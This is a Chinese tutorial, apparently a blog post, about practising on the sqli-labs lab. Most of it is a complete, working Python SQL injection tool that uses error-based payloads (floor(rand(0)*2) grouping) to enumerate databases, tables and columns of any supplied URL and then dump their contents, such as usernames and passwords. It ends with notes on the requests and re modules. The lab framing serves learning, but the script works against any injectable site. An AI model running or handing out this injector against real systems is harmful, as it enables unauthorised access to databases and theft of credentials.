@@ -1,0 +1,181 @@
+这里我用的是sqli-labs-master来做的实验
+
+首先打开sqli-labs-master如下图
+
+首先打开sqli-labs-master如下图
+
+复制url 再到python环境下运行脚本（当什么都不输入是输出帮助信息）
+
+复制url 再到python环境下运行脚本（当什么都不输入是输出帮助信息）
+
+输入URl 爆出里面的数据库名
+
+输入URl 爆出里面的数据库名
+
+输入url加上数据库名 爆出表名
+
+输入url加上数据库名 爆出表名
+
+输入url + 数据库名 + 表明
+
+输入url + 数据库名 + 表明
+
+输入url + 数据库 + 表名 + 字段名
+
+输入url + 数据库 + 表名 + 字段名
+
+这里是我数据库
+
+在shiyan这个数据库中表，用户和密码
+
+在shiyan这个数据库中表，用户和密码
+
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+from optparse import OptionParser
+import sys
+import requests
+import re
+
+parser=OptionParser()
+
+parser.add_option("-d", "--database",action="store",type="string",dest="database",help="Please input test database")
+parser.add_option("-t", "--table",action="store",type="string",dest="table",help="Please input test table")
+parser.add_option("-c", "--column",action="store",type="string",dest="column",help="Please input test column")
+parser.add_option("-u", "--url",action="store",type="string",dest="url",help="Please input test url")
+
+(options,args) = parser.parse_args()
+
+#print(options)
+#print(args)
+def main():
+    if options.url == None and options.database == None and options.table == None and options.column == None:
+        print("Please read the help")
+        parser.print_help()
+        sys.exit()
+    elif options.url != None and options.database == None and options.table == None and options.column == None:
+        getAllDatabases(options.url)
+    elif options.url != None and options.database != None and options.table == None and options.column == None:
+        getAllTables(options.url,options.database)
+    elif options.url != None and options.database != None and options.table !=None and options.column == None:
+        getAllColumnByTable(options.url,options.table,options.database)
+    elif options.url != None and options.database != None and options.table != None and options.column != None:
+        getAllContent(options.url,options.column,options.table,options.database)
+
+def http_get(url):
+    result = requests.get(url)
+    return result.content
+
+def getAllDatabases(url):
+    db_nums_payload =url + " and (select 1 from (select count(*),concat((select concat(0x7e,count(schema_name),0x7e) from information_schema.schemata),floor(rand(0)*2))x from information_schema.tables group by x)a)"
+    html = http_get(db_nums_payload)
+    result = re.search(r'~(.*?)~',html.decode('utf-8'),re.S|re.I)
+    db_nums = int(result.group(1))
+    print("数据库的个数为:%d" % db_nums)
+    for x in range(db_nums):
+        db_name_payload = url + " and (select 1 from (select count(*),concat((select concat(0x7e,schema_name,0x7e) from information_schema.schemata limit %d,1),floor(rand(0)*2))x from information_schema.tables group by x)a)" % x
+        html = http_get(db_name_payload)
+        result = re.search(r'~(.*?)~',html.decode('utf-8'),re.S|re.I)
+        db_name = result.group(1)
+        print("第%d个数据库为:%s" % (x+1,db_name))
+
+def getAllTables(url,database):
+    tab_nums_payload = url + " and (select 1 from (select count(*),concat((select concat(0x7e,count(table_name),0x7e) from information_schema.tables where table_schema = '%s'),floor(rand(0)*2))x from information_schema.tables group by x)a)" % database
+    html = http_get(tab_nums_payload)
+    result = re.search(r'~(.*?)~',html.decode('utf-8'),re.S|re.I)
+    tab_nums = int(result.group(1))
+    print("数据表的个数为:%d" % tab_nums)
+    for x in range(tab_nums):
+        tab_name_payload = url + " and (select 1 from (select count(*),concat((select concat(0x7e,table_name,0x7e) from information_schema.tables where table_schema = '%s' limit %d,1),floor(rand(0)*2))x from information_schema.tables group by x)a)" % (database,x)
+        html = http_get(tab_name_payload)
+        result = re.search(r'~(.*?)~',html.decode('utf-8'),re.S|re.I)
+        tab_name = result.group(1)
+        print("第%d个数据表为:%s" % (x+1,tab_name))
+
+def getAllColumnByTable(url,table,database):
+    colu_nums_payload = url + " and (select 1 from (select count(*),concat((select concat(0x7e,count(column_name),0x7e) from information_schema.columns where table_name = '%s' and table_schema = '%s'),floor(rand(0)*2))x from information_schema.tables group by x)a)" % (table,database)
+    html = http_get(colu_nums_payload)
+    result = re.search(r'~(.*?)~',html.decode('utf-8'),re.S|re.I)
+    colu_nums = int(result.group(1))
+    print("字段的个数为:%d" % colu_nums)
+    for x in range(colu_nums):
+        colu_name_payload = url + " and (select 1 from (select count(*),concat((select concat(0x7e,column_name,0x7e) from information_schema.columns where table_name = '%s' and table_schema = '%s' limit %d,1),floor(rand(0)*2))x from information_schema.tables group by x)a)" % (table,database,x)
+        html = http_get(colu_name_payload)
+        result = re.search(r'~(.*?)~',html.decode('utf-8'),re.S|re.I) #html后要加编码声明
+        colu_name = result.group(1)
+        print("第%d个字段为:%s" % (x+1,colu_name))
+
+def getAllContent(url,column,table,database):
+    con_nums_payload = url + " and (select 1 from (select count(*),concat((select concat(0x7e,count(%s),0x7e) from %s.%s),floor(rand(0)*2))x from information_schema.tables group by x)a)" % (column,database,table)
+    html = http_get(con_nums_payload)
+    result = re.search(r'~(.*?)~',html.decode('utf-8'),re.S|re.I)
+    con_nums = int(result.group(1))
+    print("字段%s中数据的个数为:%d" % (column,con_nums))
+    for x in range(con_nums):
+        con_name_payload = url + " and (select 1 from (select count(*),concat((select concat(0x7e,(%s),0x7e) from %s.%s limit %d,1),floor(rand(0)*2))x from information_schema.tables group by x)a)" % (column,database,table,x)
+        html = http_get(con_name_payload)
+        result = re.search(r'~(.*?)~',html.decode('utf-8'),re.S|re.I)
+        con_name = result.group(1)
+        print("字段%s的第%d个数据:%s" % (column,x+1,con_name))
+
+if __name__ == '__main__':
+  #getAllDatabases('http://127.0.0.1/sqli-labs/Less-2/?id=2')
+    #getAllTables('http://127.0.0.1/sqli-labs/Less-2/?id=2','liuyanban')
+    #getAllColumnByTable('http://127.0.0.1/sqli-labs/Less-2/?id=2','user','liuyanban')
+    #getAllContent('http://127.0.0.1/sqli-labs/Less-2/?id=2','username','user','liuyanban')
+    main()
+
+这里用了optparses，requests，re模块 sys模块可有可无。
+
+optparses 模块是传参用的接受url，数据库名，表名，字段名的
+
+requests 模块是url请求是要用到的。
+
+requests 模块请求方法
+
+
+HTTP请求类型
+
+get类型
+
+r = requests.get('https://github.com/timeline.json')
+
+post类型
+
+r = requests.post("http://m.ctrip.com/post")
+
+put类型
+
+r = requests.put('http://httpbin.org/put', data = {'key':'value'})
+
+delete类型
+
+r = requests.delete("http://m.ctrip.com/delete")
+
+head类型
+
+r = requests.head("http://m.ctrip.com/head")
+
+ptions类型
+
+r = requests.options("http://m.ctrip.com/get")
+
+requests模块接收返回的url值
+
+r.status_code #响应状态码，r是return的缩写
+
+r.raw              #返回原始响应体，也就是 urllib 的 response 对象，使用 r.raw.read() 读取
+
+r.content        #字节方式的响应体，会自动为你解码 gzip 和 deflate 压缩
+
+r.text              #字符串方式的响应体，会自动根据响应头部的字符编码进行解码
+
+r.headers       #以字典对象存储服务器响应头，但是这个字典比较特殊，字典键不区分大小写，若键不存在则返回None
+
+re 模块是正则表达式模块
+
+过滤页面信息时要用到
+
+result = re.search(r'~(.*?)~',html.decode('utf-8'),re.S|re.I)
+
